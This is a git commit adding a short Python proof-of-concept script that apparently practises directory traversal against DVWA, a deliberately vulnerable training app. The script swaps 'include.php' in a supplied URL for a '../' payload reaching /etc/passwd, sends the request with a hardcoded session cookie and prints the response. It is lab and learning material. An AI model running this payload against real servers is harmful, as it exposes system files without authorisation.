24d51beff4b34cf9fa886a01a8423298601739ca
Zach Mathis <ZachAMathis@gmail.com>
2025-08-25 00:01:55 -0400

    beginning to work on a auto-directory traversal type of thing. very rudimentary and PoC rn

---
+++ fuzzer/fuzzer.py
@@ -0,0 +1,17 @@
+import requests
+
+# Need to use a cookie in order to get past admin page on DVWA, obviously this wouldn't happen in nature
+cookie = {"PHPSESSID" : "7894ea9b4da9adba8ad39be0af5b9f8d", "security": "low" }
+
+# Taking in our input
+input_url = input("Enter URL possibly vuln to dir traversal: ")
+
+# Replacing vulnerable bit of input with our traversal payload
+mal_url = input_url.replace('include.php', '../../../../../../etc/passwd' )
+
+# Making our request with the now malicious URL
+mal_response = requests.get(mal_url, cookies=cookie)
+
+# Now printing the response
+print(mal_response.text)
+
